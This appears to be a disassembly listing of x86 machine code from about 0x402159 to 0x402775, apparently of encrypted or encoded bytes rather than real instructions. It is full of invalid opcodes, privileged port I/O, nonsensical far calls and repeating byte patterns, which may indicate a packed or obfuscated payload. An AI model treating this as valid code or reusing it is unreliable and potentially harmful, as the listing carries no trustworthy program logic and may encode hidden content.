  402159:	6c                   	insb   (%dx),%es:(%edi)
  40215a:	b3 a1                	mov    $0xa1,%bl
  40215c:	2f                   	das
  40215d:	ed                   	in     (%dx),%eax
  40215e:	87 2a                	xchg   %ebp,(%edx)
  402160:	97                   	xchg   %eax,%edi
  402161:	99                   	cltd
  402162:	c5 e7 83             	(bad)
  402165:	e8 19 66 68 e4       	call   0xe4a88783
  40216a:	87 37                	xchg   %esi,(%edi)
  40216c:	97                   	xchg   %eax,%edi
  40216d:	99                   	cltd
  40216e:	c5 66 67             	lds    0x67(%esi),%esp
  402171:	e0 b3                	loopne 0x402126
  402173:	66 68 64 fd          	pushw  $0xfd64
  402177:	e3 98                	jecxz  0x402111
  402179:	9b                   	fwait
  40217a:	c4 99 69 64 3a 66    	les    0x663a6469(%ecx),%ebx
  402180:	02 60 c5             	add    -0x3b(%eax),%ah
  402183:	d3 cc                	ror    %cl,%esp
  402185:	9b                   	fwait
  402186:	c4 99 e5 e1 c7 99    	les    -0x66381e1b(%ecx),%ebx
  40218c:	96                   	xchg   %eax,%esi
  40218d:	9b                   	fwait
  40218e:	6a 0e                	push   $0xe
  402190:	1c a8                	sbb    $0xa8,%al
  402192:	78 66                	js     0x4021fa
  402194:	e5 e1                	in     $0xe1,%eax
  402196:	c7                   	(bad)
  402197:	99                   	cltd
  402198:	96                   	xchg   %eax,%esi
  402199:	9b                   	fwait
  40219a:	6a 8e                	push   $0xffffff8e
  40219c:	6c                   	insb   (%dx),%es:(%edi)
  40219d:	39 3a                	cmp    %edi,(%edx)
  40219f:	66 eb a0             	data16 jmp 0x402142
  4021a2:	2e eb e5             	cs jmp 0x40218a
  4021a5:	99                   	cltd
  4021a6:	c5 98 97 e7 f2 99    	lds    -0x660d1869(%eax),%ebx
  4021ac:	28 e4                	sub    %ah,%ah
  4021ae:	06                   	push   %es
  4021af:	67 68 11 c3 ef ed    	addr16 push $0xedefc311
  4021b5:	9c                   	pushf
  4021b6:	c5 98 97 9b 8f 2a    	lds    0x2a8f9b97(%eax),%ebx
  4021bc:	97                   	xchg   %eax,%edi
  4021bd:	99                   	cltd
  4021be:	c5 eb ed             	(bad)
  4021c1:	35 c5 9b 97 34       	xor    $0x34979bc5,%eax
  4021c6:	b1 e3                	mov    $0xe3,%cl
  4021c8:	90                   	nop
  4021c9:	9b                   	fwait
  4021ca:	c4 99 e5 e0 3f 9b    	les    -0x64c01f1b(%ecx),%ebx
  4021d0:	97                   	xchg   %eax,%edi
  4021d1:	9a c5 36 80 e7 66 66 	lcall  $0x6666,$0xe78036c5
  4021d8:	68 e7 fe 6a e9       	push   $0xe96afee7
  4021dd:	8f                   	(bad)
  4021de:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  4021e0:	68 64 50 62 e5       	push   $0xe5625064
  4021e5:	e1 c7                	loope  0x4021ae
  4021e7:	99                   	cltd
  4021e8:	96                   	xchg   %eax,%esi
  4021e9:	9b                   	fwait
  4021ea:	6a 0e                	push   $0xe
  4021ec:	07                   	pop    %es
  4021ed:	a8 78                	test   $0x78,%al
  4021ef:	66 e5 e1             	in     $0xe1,%ax
  4021f2:	c7                   	(bad)
  4021f3:	99                   	cltd
  4021f4:	96                   	xchg   %eax,%esi
  4021f5:	9b                   	fwait
  4021f6:	6a 8e                	push   $0xffffff8e
  4021f8:	c0 38 3a             	sarb   $0x3a,(%eax)
  4021fb:	66 eb a0             	data16 jmp 0x40219e
  4021fe:	2a e7                	sub    %bh,%ah
  402200:	9b                   	fwait
  402201:	13 31                	adc    (%ecx),%esi
  402203:	66 68 e7 87          	pushw  $0x87e7
  402207:	1a 97 9a c5 66 1c    	sbb    0x1c66c59a(%edi),%dl
  40220d:	64 b1 e3             	fs mov $0xe3,%cl
  402210:	10 9b c4 99 38 ef    	adc    %bl,-0x10c7663c(%ebx)
  402216:	0a 99 3e 6c c5 e3    	or     -0x1c3a93c2(%ecx),%bl
  40221c:	cc                   	int3
  40221d:	9b                   	fwait
  40221e:	c4 99 e3 e1 a6 99    	les    -0x66591e1d(%ecx),%ebx
  402224:	96                   	xchg   %eax,%esi
  402225:	9b                   	fwait
  402226:	03 e3                	add    %ebx,%esp
  402228:	cc                   	int3
  402229:	9b                   	fwait
  40222a:	c4 99 67 e6 29 98    	les    -0x67d61999(%ecx),%ebx
  402230:	97                   	xchg   %eax,%edi
  402231:	9b                   	fwait
  402232:	b1 e3                	mov    $0xe3,%cl
  402234:	c8 9b c4 99          	enter  $0xc49b,$0x99
  402238:	38 ef                	cmp    %ch,%bh
  40223a:	0a 99 3e 6c b1 e3    	or     -0x1c4e93c2(%ecx),%bl
  402240:	f0 9b                	lock fwait
  402242:	c4 99 38 ef 0a 99    	les    -0x66f510c8(%ecx),%ebx
  402248:	3e 6c                	ds insb (%dx),%es:(%edi)
  40224a:	b3 be                	mov    $0xbe,%bl
  40224c:	9f                   	lahf
  40224d:	87 b3 e3 14 9b c4    	xchg   %esi,-0x3b64eb1d(%ebx)
  402253:	99                   	cltd
  402254:	e1 a7                	loope  0x4021fd
  402256:	c5 e3 84             	(bad)
  402259:	9b                   	fwait
  40225a:	c4 99 e3 e1 de 99    	les    -0x66211e1d(%ecx),%ebx
  402260:	96                   	xchg   %eax,%esi
  402261:	9b                   	fwait
  402262:	03 e3                	add    %ebx,%esp
  402264:	84 9b c4 99 67 e6    	test   %bl,-0x1998663c(%ebx)
  40226a:	e0 9a                	loopne 0x402206
  40226c:	97                   	xchg   %eax,%edi
  40226d:	9b                   	fwait
  40226e:	b9 db 98 9b c4       	mov    $0xc49b98db,%ecx
  402273:	99                   	cltd
  402274:	68 11 3d a0 ed       	push   $0xeda03d11
  402279:	99                   	cltd
  40227a:	c5 98 97 64 b1 e3    	lds    -0x1c4e9b69(%eax),%ebx
  402280:	80 9b c4 99 38 ef 0a 	sbbb   $0xa,-0x10c7663c(%ebx)
  402287:	99                   	cltd
  402288:	3e 6c                	ds insb (%dx),%es:(%edi)
  40228a:	b9 db b8 9b c4       	mov    $0xc49bb8db,%ecx
  40228f:	99                   	cltd
  402290:	68 10 36 ed ed       	push   $0xeded3610
  402295:	b4 c5                	mov    $0xc5,%ah
  402297:	98                   	cwtl
  402298:	97                   	xchg   %eax,%edi
  402299:	34 b1                	xor    $0xb1,%al
  40229b:	56                   	push   %esi
  40229c:	97                   	xchg   %eax,%edi
  40229d:	32 32                	xor    (%edx),%dh
  40229f:	e7 9b                	out    %eax,$0x9b
  4022a1:	58                   	pop    %eax
  4022a2:	13 66 68             	adc    0x68(%esi),%esp
  4022a5:	e7 87                	out    %eax,$0x87
  4022a7:	b2 97                	mov    $0x97,%dl
  4022a9:	9a c5 66 1c 68 b1 e3 	lcall  $0xe3b1,$0x681c66c5
  4022b0:	bc 9b c4 99 38       	mov    $0x3899c49b,%esp
  4022b5:	ef                   	out    %eax,(%dx)
  4022b6:	0a 99 3e 6c b1 e3    	or     -0x1c4e93c2(%ecx),%bl
  4022bc:	b0 9b                	mov    $0x9b,%al
  4022be:	c4 99 38 ef 0a 99    	les    -0x66f510c8(%ecx),%ebx
  4022c4:	3e 6c                	ds insb (%dx),%es:(%edi)
  4022c6:	b1 e3                	mov    $0xe3,%cl
  4022c8:	b4 9b                	mov    $0x9b,%ah
  4022ca:	c4 99 38 ef 0a 99    	les    -0x66f510c8(%ecx),%ebx
  4022d0:	3e 6c                	ds insb (%dx),%es:(%edi)
  4022d2:	b3 be                	mov    $0xbe,%bl
  4022d4:	41                   	inc    %ecx
  4022d5:	bc b3 a5 e3 e1       	mov    $0xe1e3a5b3,%esp
  4022da:	da 99 96 9b 6a ed    	ficompl -0x1295646a(%ecx)
  4022e0:	58                   	pop    %eax
  4022e1:	9b                   	fwait
  4022e2:	6c                   	insb   (%dx),%es:(%edi)
  4022e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4022e4:	81 76 c3 99 97 3b 64 	xorl   $0x643b9799,-0x3d(%esi)
  4022eb:	3d a1 a7 6f ef       	cmp    $0xef6fa7a1,%eax
  4022f0:	8d 0e                	lea    (%esi),%ecx
  4022f2:	c5 0e                	lds    (%esi),%ecx
  4022f4:	78 c5                	js     0x4022bb
  4022f6:	78 66                	js     0x40235e
  4022f8:	00 fe                	add    %bh,%dh
  4022fa:	2a 26                	sub    (%esi),%ah
  4022fc:	68 00 9b 66 68       	push   $0x68669b00
  402301:	64 3a 36             	cmp    %fs:(%esi),%dh
  402304:	0c ed                	or     $0xed,%al
  402306:	1f                   	pop    %ds
  402307:	66 68 64 3a          	pushw  $0x3a64
  40230b:	e5 84                	in     $0x84,%eax
  40230d:	7c 69                	jl     0x402378
  40230f:	30 3f                	xor    %bh,(%edi)
  402311:	ed                   	in     (%dx),%eax
  402312:	5f                   	pop    %edi
  402313:	8e af 21 de 7c 74    	mov    0x747cde21(%edi),%gs
  402319:	f2 11 de             	repnz adc %ebx,%esi
  40231c:	9d                   	popf
  40231d:	5a                   	pop    %edx
  40231e:	3a 66 9f             	cmp    -0x61(%esi),%ah
  402321:	01 de                	add    %ebx,%esi
  402323:	ef                   	out    %eax,(%dx)
  402324:	2d 84 b1 1b 88       	sub    $0x881bb184,%eax
  402329:	ed                   	in     (%dx),%eax
  40232a:	47                   	inc    %edi
  40232b:	82 af 21 c6 66 68 64 	subb   $0x64,0x6866c621(%edi)
  402332:	3a e7                	cmp    %bh,%ah
  402334:	05 80 df 6e 68       	add    $0x686edf80,%eax
  402339:	64 52                	fs push %edx
  40233b:	3e 6a 64             	ds push $0x64
  40233e:	3a 8e 80 3e 3a 66    	cmp    0x663a3e80(%esi),%cl
  402344:	eb a0                	jmp    0x4022e6
  402346:	3e 8e 3b             	mov    %ds:(%ebx),%?
  402349:	9c                   	pushf
  40234a:	c5 99 eb 59 36 c7    	lds    -0x38c9a615(%ecx),%ebx
  402350:	2a 64 3a 13          	sub    0x13(%edx,%edi,1),%ah
  402354:	b6 8f                	mov    $0x8f,%dh
  402356:	04 ed                	add    $0xed,%al
  402358:	15 80 b3 9e 9f       	adc    $0x9f9eb380,%eax
  40235d:	83 b3 23 b4 ef 47 ba 	xorl   $0xffffffba,0x47efb423(%ebx)
  402364:	e1 19                	loope  0x40237f
  402366:	de a1 2d 98 c5 99    	fisubs -0x663a67d3(%ecx)
  40236c:	97                   	xchg   %eax,%edi
  40236d:	9b                   	fwait
  40236e:	d1 43 af             	roll   $1,-0x51(%ebx)
  402371:	21 e6                	and    %esp,%esi
  402373:	67 68 64 3a ed 2d    	addr16 push $0x2ded3a64
  402379:	b8 f9 ed 0d 8c       	mov    $0x8c0dedf9,%eax
  40237e:	fd                   	std
  40237f:	23 b0 28 2c a1 32    	and    0x32a12c28(%eax),%esi
  402385:	e5 57                	in     $0x57,%eax
  402387:	be 9c 2a 3a 66       	mov    $0x663a2a9c,%esi
  40238c:	83 c1 fd             	add    $0xfffffffd,%ecx
  40238f:	23 94 9b c5 99 97 3b 	and    0x3b9799c5(%ebx,%ebx,4),%edx
  402396:	64 3d f9 ef 7f 96    	fs cmp $0x967feff9,%eax
  40239c:	0c c7                	or     $0xc7,%al
  40239e:	3a 66 68             	cmp    0x68(%esi),%ah
  4023a1:	64 ab                	fs stos %eax,%es:(%edi)
  4023a3:	af                   	scas   %es:(%edi),%eax
  4023a4:	aa                   	stos   %al,%es:(%edi)
  4023a5:	60                   	pusha
  4023a6:	3a 30                	cmp    (%eax),%dh
  4023a8:	3f                   	aas
  4023a9:	db 99 2a c3 18 b3    	fistpl -0x4ce73cd6(%ecx)
  4023af:	9e                   	sahf
  4023b0:	59                   	pop    %ecx
  4023b1:	9c                   	pushf
  4023b2:	b3 a1                	mov    $0xa1,%bl
  4023b4:	00 68 9b             	add    %ch,-0x65(%eax)
  4023b7:	24 68                	and    $0x68,%al
  4023b9:	0e                   	push   %cs
  4023ba:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4023bd:	0c d4                	or     $0xd4,%al
  4023bf:	44                   	inc    %esp
  4023c0:	28 64 50 66          	sub    %ah,0x66(%eax,%edx,2)
  4023c4:	02 64 d2 37          	add    0x37(%edx,%edx,8),%ah
  4023c8:	30 64 3a ef          	xor    %ah,-0x11(%edx,%edi,1)
  4023cc:	ae                   	scas   %es:(%edi),%al
  4023cd:	32 d2                	xor    %dl,%dl
  4023cf:	af                   	scas   %es:(%edi),%eax
  4023d0:	3e 64 3a e7          	ds fs cmp %bh,%ah
  4023d4:	af                   	scas   %es:(%edi),%eax
  4023d5:	69 11 66 68 3b 64    	imul   $0x643b6866,(%ecx),%edx
  4023db:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4023dc:	3d ed df e5 84       	cmp    $0x84e5dfed,%eax
  4023e1:	7c 69                	jl     0x40244c
  4023e3:	30 e3                	xor    %ah,%bl
  4023e5:	39 32                	cmp    %esi,(%edx)
  4023e7:	d8 59 15             	fcomps 0x15(%ecx)
  4023ea:	06                   	push   %es
  4023eb:	41                   	inc    %ecx
  4023ec:	e9 8a ad 40 68       	jmp    0x6880d17b
  4023f1:	64 c5 63 68          	lds    %fs:0x68(%ebx),%esp
  4023f5:	c5 78 66             	lds    0x66(%eax),%edi
  4023f8:	e1 bd                	loope  0x4023b7
  4023fa:	b9 43 6c e4 7a       	mov    $0x7ae46c43,%ecx
  4023ff:	66 68 e7 1f          	pushw  $0x1fe7
  402403:	6e                   	outsb  %ds:(%esi),(%dx)
  402404:	e6 25                	out    %al,$0x25
  402406:	3a 66 d0             	cmp    -0x30(%esi),%ah
  402409:	be 4e 66 68 93       	mov    $0x9368664e,%esi
  40240e:	dc ef                	fsubr  %st,%st(7)
  402410:	2d 98 b3 a0 eb       	sub    $0xeba0b398,%eax
  402415:	41                   	inc    %ecx
  402416:	1e                   	push   %ds
  402417:	e8 29 64 3a e5       	call   0xe57a8845
  40241c:	4d                   	dec    %ebp
  40241d:	6c                   	insb   (%dx),%es:(%edi)
  40241e:	ba 26 68 64 fd       	mov    $0xfd646826,%edx
  402423:	63 84 e9 7b 66 6c 64 	arpl   %eax,0x646c667b(%ecx,%ebp,8)
  40242a:	3a 66 af             	cmp    -0x51(%esi),%ah
  40242d:	61                   	popa
  40242e:	7e ef                	jle    0x40241f
  402430:	29 64 3e 66          	sub    %esp,0x66(%esi,%edi,1)
  402434:	68 64 b3 ae 29       	push   $0x29aeb364
  402439:	ee                   	out    %al,(%dx)
  40243a:	3a c4                	cmp    %ah,%al
  40243c:	28 ed                	sub    %ch,%ch
  40243e:	7b 66                	jnp    0x4024a6
  402440:	67 d2 3f             	sarb   %cl,(%bx)
  402443:	26 e1 25             	es loope 0x40246b
  402446:	3a 6f a8             	cmp    -0x58(%edi),%ch
  402449:	6b b6 18 6a 64 3a 5b 	imul   $0x5b,0x3a646a18(%esi),%esi
  402450:	97                   	xchg   %eax,%edi
  402451:	64 3a 66 67          	cmp    %fs:0x67(%esi),%ah
  402455:	eb 49                	jmp    0x4024a0
  402457:	64 68 64 c5 42 ed    	fs push $0xed42c564
  40245d:	78 9b                	js     0x4023fa
  40245f:	24 68                	and    $0x68,%al
  402461:	e4 37                	in     $0x37,%al
  402463:	6e                   	outsb  %ds:(%esi),(%dx)
  402464:	e6 25                	out    %al,$0x25
  402466:	3a 26                	cmp    (%esi),%ah
  402468:	81 04 38 66 68 9b 3f 	addl   $0x3f9b6866,(%eax,%edi,1)
  40246f:	66 c9                	leavew
  402471:	26 3a 57 a8          	cmp    %es:-0x58(%edi),%dl
  402475:	e4 03                	in     $0x3,%al
  402477:	46                   	inc    %esi
  402478:	67 f1                	addr16 int1
  40247a:	fa                   	cli
  40247b:	2e eb 84             	cs jmp 0x402402
  40247e:	3e 26 e1 21          	ds loope,pt 0x4024a3
  402482:	ce                   	into
  402483:	67 6d                	insl   (%dx),%es:(%di)
  402485:	40                   	inc    %eax
  402486:	b4 27                	mov    $0x27,%ah
  402488:	68 8d 05 64 68       	push   $0x6864058d
  40248d:	64 ba 6b 60 ea 7b    	fs mov $0x7bea606b,%edx
  402493:	66 28 92 3b 5e 67 e1 	data16 sub %dl,-0x1e98a1c5(%edx)
  40249a:	15 64 68 64 cc       	adc    $0xcc646864,%eax
  40249f:	63 28                	arpl   %ebp,(%eax)
  4024a1:	ed                   	in     (%dx),%eax
  4024a2:	7b 66                	jnp    0x40250a
  4024a4:	69 10 37 c7 84 e9    	imul   $0xe984c737,(%eax),%edx
  4024aa:	7b 66                	jnp    0x402512
  4024ac:	69 61 1e e8 29 64 d1 	imul   $0xd16429e8,0x1e(%ecx),%esp
  4024b3:	60                   	pusha
  4024b4:	97                   	xchg   %eax,%edi
  4024b5:	61                   	popa
  4024b6:	1e                   	push   %ds
  4024b7:	e8 29 64 b3 96       	call   0x96f388e5
  4024bc:	41                   	inc    %ecx
  4024bd:	94                   	xchg   %eax,%esp
  4024be:	b3 a0                	mov    $0xa0,%bl
  4024c0:	81 6c 38 66 68 9b 3f 	subl   $0x423f9b68,0x66(%eax,%edi,1)
  4024c7:	42 
  4024c8:	e6 25                	out    %al,$0x25
  4024ca:	3a 8f 95 65 3a 66    	cmp    0x663a6595(%edi),%cl
  4024d0:	97                   	xchg   %eax,%edi
  4024d1:	61                   	popa
  4024d2:	3a c7                	cmp    %bh,%al
  4024d4:	2a 64 cc 63          	sub    0x63(%esp,%ecx,8),%ah
  4024d8:	60                   	pusha
  4024d9:	ea 7b 66 78 10 3d 57 	ljmp   $0x573d,$0x1078667b
  4024e0:	a8 8d                	test   $0x8d,%al
  4024e2:	02 65 68             	add    0x68(%ebp),%ah
  4024e5:	64 b3 96             	fs mov $0x96,%bl
  4024e8:	59                   	pop    %ecx
  4024e9:	94                   	xchg   %eax,%esp
  4024ea:	b3 a0                	mov    $0xa0,%bl
  4024ec:	e8 69 32 e8 29       	call   0x2a28575a
  4024f1:	64 2a c6             	fs sub %dh,%al
  4024f4:	28 ed                	sub    %ch,%ch
  4024f6:	7b 66                	jnp    0x40255e
  4024f8:	ca 74 ba             	lret   $0xba74
  4024fb:	26 68 8d 0e 99 97    	es push $0x97990e8d
  402501:	9b                   	fwait
  402502:	cc                   	int3
  402503:	63 60 ea             	arpl   %esp,-0x16(%eax)
  402506:	7b 66                	jnp    0x40256e
  402508:	6c                   	insb   (%dx),%es:(%edi)
  402509:	10 3d 57 a8 8d 36    	adc    %bh,0x368da857
  40250f:	65 68 64 bb a0 18    	gs push $0x18a0bb64
  402515:	22 3a                	and    (%edx),%bh
  402517:	66 e8 69 32          	callw  0x5784
  40251b:	e8 29 64 3e 8f       	call   0x8f7e8949
  402520:	7a 9b                	jp     0x4024bd
  402522:	c5 99 9e 61 32 e8    	lds    -0x17cd9e62(%ecx),%ebx
  402528:	29 64 32 12          	sub    %esp,0x12(%edx,%esi,1)
  40252c:	6f                   	outsl  %ds:(%esi),(%dx)
  40252d:	55                   	push   %ebp
  40252e:	fa                   	cli
  40252f:	8f 82 66 3a 66 d0    	pop    -0x2f99c59a(%edx)
  402535:	29 6a 66             	sub    %ebp,0x66(%edx)
  402538:	68 93 dc ef 2d       	push   $0x2defdc93
  40253d:	94                   	xchg   %eax,%esp
  40253e:	b3 a0                	mov    $0xa0,%bl
  402540:	e8 69 32 e8 29       	call   0x2a2857ae
  402545:	64 32 c6             	fs xor %dh,%al
  402548:	28 ed                	sub    %ch,%ch
  40254a:	7b 66                	jnp    0x4025b2
  40254c:	ca 54 b5             	lret   $0xb554
  40254f:	27                   	daa
  402550:	68 8d da 98 97       	push   $0x9798da8d
  402555:	9b                   	fwait
  402556:	cc                   	int3
  402557:	63 60 ea             	arpl   %esp,-0x16(%eax)
  40255a:	7b 66                	jnp    0x4025c2
  40255c:	69 10 3d 57 a8 8d    	imul   $0x8da8573d,(%eax),%edx
  402562:	82 64 68 64 b3       	andb   $0xb3,0x64(%eax,%ebp,2)
  402567:	96                   	xchg   %eax,%esi
  402568:	41                   	inc    %ecx
  402569:	94                   	xchg   %eax,%esp
  40256a:	b3 a0                	mov    $0xa0,%bl
  40256c:	e8 69 32 e8 29       	call   0x2a2857da
  402571:	64 3b a1 6d 88 b7 27 	cmp    %fs:0x27b7886d(%ecx),%esp
  402578:	68 66 3a 66 68       	push   $0x68663a66
  40257d:	8d 8e 98 97 9b cc    	lea    -0x33646868(%esi),%ecx
  402583:	63 60 ea             	arpl   %esp,-0x16(%eax)
  402586:	7b 66                	jnp    0x4025ee
  402588:	6a 10                	push   $0x10
  40258a:	3d 57 a8 8d b6       	cmp    $0xb68da857,%eax
  40258f:	64 68 64 b3 96 59    	fs push $0x5996b364
  402595:	94                   	xchg   %eax,%esp
  402596:	b3 a0                	mov    $0xa0,%bl
  402598:	e8 69 32 e8 29       	call   0x2a285806
  40259d:	64 38 a1 6d 20 b3 27 	cmp    %ah,%fs:0x27b3206d(%ecx)
  4025a4:	68 66 3a 66 68       	push   $0x68663a66
  4025a9:	8d b2 98 97 9b c5    	lea    -0x3a646868(%edx),%esi
  4025af:	63 68 c5             	arpl   %ebp,-0x3b(%eax)
  4025b2:	78 66                	js     0x40261a
  4025b4:	97                   	xchg   %eax,%edi
  4025b5:	61                   	popa
  4025b6:	1e                   	push   %ds
  4025b7:	e8 29 64 bb 90       	call   0x90fb89e5
  4025bc:	c9                   	leave
  4025bd:	36 3a 66 e8          	cmp    %ss:-0x18(%esi),%ah
  4025c1:	69 32 e8 29 64 7a    	imul   $0x7a6429e8,(%edx),%esi
  4025c7:	8f 69 65 3a          	(bad)
  4025cb:	66 c9                	leavew
  4025cd:	88 b7 27 68 65 3f    	mov    %dh,0x3f656827(%edi)
  4025d3:	42                   	inc    %edx
  4025d4:	e6 25                	out    %al,$0x25
  4025d6:	3a e7                	cmp    %bh,%ah
  4025d8:	ae                   	scas   %es:(%edi),%al
  4025d9:	5d                   	pop    %ebp
  4025da:	5e                   	pop    %esi
  4025db:	66 68 e4 37          	pushw  $0x37e4
  4025df:	6e                   	outsb  %ds:(%esi),(%dx)
  4025e0:	e6 25                	out    %al,$0x25
  4025e2:	3a 26                	cmp    (%esi),%ah
  4025e4:	81 80 3a 66 68 c5 d6 	addl   $0x6429ebd6,-0x3a9799c6(%eax)
  4025eb:	eb 29 64 
  4025ee:	b9 a6 6a 65 3f       	mov    $0x3f656aa6,%ecx
  4025f3:	42                   	inc    %edx
  4025f4:	e6 25                	out    %al,$0x25
  4025f6:	3a 8f b9 64 3a 66    	cmp    0x663a64b9(%edi),%cl
  4025fc:	c9                   	leave
  4025fd:	20 b3 27 68 65 3f    	and    %dh,0x3f656827(%ebx)
  402603:	6e                   	outsb  %ds:(%esi),(%dx)
  402604:	e8 24 3a 8f a9       	call   0xa9cf602d
  402609:	64 3a 66 c9          	cmp    %fs:-0x37(%esi),%ah
  40260d:	88 b7 27 68 65 3f    	mov    %dh,0x3f656827(%edi)
  402613:	42                   	inc    %edx
  402614:	e6 25                	out    %al,$0x25
  402616:	3a 8f d9 64 3a 66    	cmp    0x663a64d9(%edi),%cl
  40261c:	97                   	xchg   %eax,%edi
  40261d:	61                   	popa
  40261e:	3a c7                	cmp    %bh,%al
  402620:	2a 64 b9 63          	sub    0x63(%ecx,%edi,4),%ah
  402624:	4c                   	dec    %esp
  402625:	ea 7b 66 6a 8d a5 66 	ljmp   $0x66a5,$0x8d6a667b
  40262c:	68 64 b3 96 9f       	push   $0x9f96b364
  402631:	82 b3 23 84 ed fc e5 	xorb   $0xe5,-0x3127bdd(%ebx)
  402638:	6d                   	insl   (%dx),%es:(%edi)
  402639:	40                   	inc    %eax
  40263a:	b4 27                	mov    $0x27,%ah
  40263c:	68 67 d3 ec 68       	push   $0x68ecd367
  402641:	64 3a 57 a8          	cmp    %fs:-0x58(%edi),%dl
  402645:	8d                   	lea    (bad),%ebp
  402646:	ee                   	out    %al,(%dx)
  402647:	67 68 64 ba 6b 60    	addr16 push $0x606bba64
  40264d:	ea 7b 66 48 ed f2 27 	ljmp   $0x27f2,$0xed48667b
  402654:	e2 64                	loop   0x4026ba
  402656:	98                   	cwtl
  402657:	26 e7 26             	es out %eax,$0x26
  40265a:	3a ef                	cmp    %bh,%ch
  40265c:	98                   	cwtl
  40265d:	55                   	push   %ebp
  40265e:	ca ef ae             	lret   $0xaeef
  402661:	6b 8c 63 28 eb 78 66 	imul   $0x61,0x6678eb28(%ebx,%eiz,2),%ecx
  402668:	61 
  402669:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40266a:	46                   	inc    %esi
  40266b:	32 eb                	xor    %bl,%ch
  40266d:	9c                   	pushf
  40266e:	31 19                	xor    %ebx,(%ecx)
  402670:	6f                   	outsl  %ds:(%esi),(%dx)
  402671:	9b                   	fwait
  402672:	1e                   	push   %ds
  402673:	e3 74                	jecxz  0x4026e9
  402675:	c1 78 66 55          	sarl   $0x55,0x66(%eax)
  402679:	e4 3a                	in     $0x3a,%al
  40267b:	66 68 18 7b          	pushw  $0x7b18
  40267f:	5b                   	pop    %ebx
  402680:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402681:	64 3a 66 17          	cmp    %fs:0x17(%esi),%ah
  402685:	5e                   	pop    %esi
  402686:	c5 42 ed             	lds    -0x13(%edx),%eax
  402689:	28 99 24 68 e4 37    	sub    %bl,0x37e46824(%ecx)
  40268f:	6e                   	outsb  %ds:(%esi),(%dx)
  402690:	e6 25                	out    %al,$0x25
  402692:	3a 26                	cmp    (%esi),%ah
  402694:	83 53 c5 63          	adcl   $0x63,-0x3b(%ebx)
  402698:	68 c5 78 66 83       	push   $0x836678c5
  40269d:	4b                   	dec    %ebx
  40269e:	9b                   	fwait
  40269f:	8a e5                	mov    %ch,%ah
  4026a1:	25 3a 67 6d 40       	and    $0x406d673a,%eax
  4026a6:	b4 27                	mov    $0x27,%ah
  4026a8:	68 8f 18 99 6d       	push   $0x6d99188f
  4026ad:	40                   	inc    %eax
  4026ae:	b4 27                	mov    $0x27,%ah
  4026b0:	68 ed ca 57 98       	push   $0x9857caed
  4026b5:	ed                   	in     (%dx),%eax
  4026b6:	fc                   	cld
  4026b7:	e6 65                	out    %al,$0x65
  4026b9:	6c                   	insb   (%dx),%es:(%edi)
  4026ba:	b4 27                	mov    $0x27,%ah
  4026bc:	68 24 d1 6b 59       	push   $0x596bd124
  4026c1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4026c2:	d3 31                	shll   %cl,(%ecx)
  4026c4:	69 64 3a ef 98 65 ca 	imul   $0xefca6598,-0x11(%edx,%edi,1),%esp
  4026cb:	ef 
  4026cc:	ae                   	scas   %es:(%edi),%al
  4026cd:	9b                   	fwait
  4026ce:	3f                   	aas
  4026cf:	66 c9                	leavew
  4026d1:	26 3a 90 6d 6c b4 27 	cmp    %es:0x27b46c6d(%eax),%dl
  4026d8:	68 24 35 e2 af       	push   $0xafe23524
  4026dd:	64 3a 66 e1          	cmp    %fs:-0x1f(%esi),%ah
  4026e1:	ac                   	lods   %ds:(%esi),%al
  4026e2:	7b ec                	jnp    0x4026d0
  4026e4:	68 c6 5a f6 2a       	push   $0x2af65ac6
  4026e9:	64 82 ae 59 64 3a 91 	subb   $0x8e,%fs:-0x6ec59ba7(%esi)
  4026f0:	8e 
  4026f1:	ed                   	in     (%dx),%eax
  4026f2:	7f 96                	jg     0x40268a
  4026f4:	e1 a2                	loope  0x402698
  4026f6:	35 d0 6d 04 aa       	xor    $0xaa046dd0,%eax
  4026fb:	24 68                	and    $0x68,%al
  4026fd:	41                   	inc    %ecx
  4026fe:	fa                   	cli
  4026ff:	66 68 64 b2          	pushw  $0xb264
  402703:	23 9f 6b 8c 63 08    	and    0x8638c6b(%edi),%ebx
  402709:	f4                   	hlt
  40270a:	78 66                	js     0x402772
  40270c:	eb 84                	jmp    0x402692
  40270e:	3d ee 2d 92 35       	cmp    $0x35922dee,%eax
  402713:	d0 2d 93 07 a6 68    	shrb   $1,0x68a60793
  402719:	64 3a 69 ec          	cmp    %fs:-0x14(%ecx),%ch
  40271d:	e2 3a                	loop   0x402759
  40271f:	66 68 e4 47          	pushw  $0x47e4
  402723:	91                   	xchg   %eax,%ecx
  402724:	28 11                	sub    %dl,(%ecx)
  402726:	3c 99                	cmp    $0x99,%al
  402728:	6d                   	insl   (%dx),%es:(%edi)
  402729:	6c                   	insb   (%dx),%es:(%edi)
  40272a:	ba 26 68 ed ca       	mov    $0xcaed6826,%edx
  40272f:	91                   	xchg   %eax,%ecx
  402730:	8e ed                	mov    %ebp,%gs
  402732:	7f 8a                	jg     0x4026be
  402734:	e1 a2                	loope  0x4026d8
  402736:	35 d0 2d 93 07       	xor    $0x7932dd0,%eax
  40273b:	e6 68                	out    %al,$0x68
  40273d:	64 3a 13             	cmp    %fs:(%ebx),%dl
  402740:	63 c5                	arpl   %eax,%ebp
  402742:	7e ef                	jle    0x402733
  402744:	29 64 3b 63          	sub    %esp,0x63(%ebx,%edi,1)
  402748:	60                   	pusha
  402749:	e4 7a                	in     $0x7a,%al
  40274b:	66 eb 59             	data16 jmp 0x4027a7
  40274e:	7e ef                	jle    0x40273f
  402750:	29 64 38 13          	sub    %esp,0x13(%eax,%edi,1)
  402754:	7d e4                	jge    0x40273a
  402756:	47                   	inc    %edi
  402757:	91                   	xchg   %eax,%ecx
  402758:	68 11 76 e6 15       	push   $0x15e67611
  40275d:	92                   	xchg   %eax,%edx
  40275e:	3c 13                	cmp    $0x13,%al
  402760:	2e e7 3f             	cs out %eax,$0x3f
  402763:	6e                   	outsb  %ds:(%esi),(%dx)
  402764:	e8 24 3a 64 83       	call   0x83a4618d
  402769:	59                   	pop    %ecx
  40276a:	ba 1b 9e 60 4f       	mov    $0x4f609e1b,%edx
  40276f:	42                   	inc    %edx
  402770:	e8 69 32 e8 29       	call   0x2a2859de
  402775:	64 ba ef 98 4d ca    	fs mov $0xca4d98ef,%edx
